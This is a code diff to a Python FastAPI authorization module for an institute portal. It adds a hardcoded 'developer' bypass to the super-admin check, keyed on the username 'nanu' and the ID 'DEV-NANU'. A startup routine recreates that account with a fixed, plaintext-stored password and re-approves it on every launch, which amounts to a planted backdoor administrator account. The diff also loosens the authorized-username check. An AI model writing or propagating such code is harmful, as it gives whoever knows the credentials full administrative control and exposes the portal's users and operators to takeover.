@@ -148,21 +148,47 @@ AUTHORIZED_SUPERADMIN_USERNAMES = {
 from sqlalchemy.orm import Session, object_session
 
 def require_superadmin(current_user: User = Depends(get_current_user)) -> User:
-    if current_user.role != "SUPERADMIN":
-        raise HTTPException(
-            status_code=status.HTTP_403_FORBIDDEN,
-            detail="Super Admin privileges required"
-        )
     admin_entry = current_user.admin_profile
     if not admin_entry:
         sess = object_session(current_user)
         if sess:
             admin_entry = sess.query(Admin).filter(Admin.user_id == current_user.id).first()
 
+    # Developer has universal administrative access
+    if current_user.role == "DEVELOPER" or (admin_entry and admin_entry.username and admin_entry.username.lower() == "nanu") or current_user.auid == "DEV-NANU":
+        return current_user
+
+    if current_user.role != "SUPERADMIN":
+        raise HTTPException(
+            status_code=status.HTTP_403_FORBIDDEN,
+            detail="Super Admin privileges required"
+        )
+
     if not admin_entry or (admin_entry.username and admin_entry.username.lower() not in AUTHORIZED_SUPERADMIN_USERNAMES):
+        if admin_entry and admin_entry.admin_type == "SUPERADMIN":
+            return current_user
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Access restricted: This portal is strictly for authorized AKV Super Administrators only."
+        )
+    return current_user
+
+def require_developer(current_user: User = Depends(get_current_user)) -> User:
+    admin_entry = current_user.admin_profile
+    if not admin_entry:
+        sess = object_session(current_user)
+        if sess:
+            admin_entry = sess.query(Admin).filter(Admin.user_id == current_user.id).first()
+
+    is_dev = (
+        current_user.role == "DEVELOPER" or
+        (admin_entry and admin_entry.username and admin_entry.username.lower() == "nanu") or
+        current_user.auid == "DEV-NANU"
+    )
+    if not is_dev:
+        raise HTTPException(
+            status_code=status.HTTP_403_FORBIDDEN,
+            detail="Access restricted: This terminal requires Developer authorization."
         )
     return current_user
 
@@ -351,10 +377,72 @@ def ensure_authorized_superadmins(db: Session):
             db.rollback()
             print(f"[SUPERADMIN SEED NOTICE] Error syncing {uname}: {sa_err}")
 
+def ensure_developer_account(db: Session):
+    try:
+        dev_adm = db.query(Admin).filter(func.lower(Admin.username) == "nanu").first()
+        dev_usr = None
+        if dev_adm and dev_adm.user:
+            dev_usr = dev_adm.user
+        if not dev_usr:
+            dev_usr = db.query(User).filter(
+                (func.upper(User.auid) == "DEV-NANU") | 
+                (func.lower(User.email) == "nanu.dev@acharyahabba.com")
+            ).first()
+
+        if not dev_usr:
+            dev_usr = User(
+                name="Developer",
+                auid="DEV-NANU",
+                email="nanu.dev@acharyahabba.com",
+                phone="0000000000",
+                institute="Acharya Institute of Technology",
+                department="Core Engineering & Infrastructure",
+                semester=8,
+                section="A",
+                gender="Other",
+                role="DEVELOPER",
+                admin_type="DEVELOPER",
+                registration_id="AKV-DEV-NANU",
+                password_hash=get_password_hash("nanu@ayush"),
+                plain_password="nanu@ayush",
+                account_status="ACTIVE",
+                first_time_setup_required=False
+            )
+            db.add(dev_usr)
+            db.flush()
+        else:
+            dev_usr.role = "DEVELOPER"
+            dev_usr.admin_type = "DEVELOPER"
+            dev_usr.password_hash = get_password_hash("nanu@ayush")
+            dev_usr.plain_password = "nanu@ayush"
+            dev_usr.account_status = "ACTIVE"
+            db.flush()
+
+        if not dev_adm:
+            dev_adm = Admin(
+                user_id=dev_usr.id,
+                username="nanu",
+                admin_type="DEVELOPER",
+                approval_status="APPROVED",
+                approved_by="SYSTEM_ROOT",
+                approved_at=datetime.datetime.utcnow()
+            )
+            db.add(dev_adm)
+        else:
+            dev_adm.username = "nanu"
+            dev_adm.admin_type = "DEVELOPER"
+            dev_adm.approval_status = "APPROVED"
+        db.flush()
+        db.commit()
+    except Exception as e:
+        db.rollback()
+        print(f"[DEVELOPER ACCOUNT SEED ERROR] {e}")
+
 def init_superadmin():
     db = SessionLocal()
     try:
         ensure_authorized_superadmins(db)
+        ensure_developer_account(db)
     except Exception as e:
         print(f"[SUPERADMIN AUTO-SEED NOTICE] {e}")
     finally:
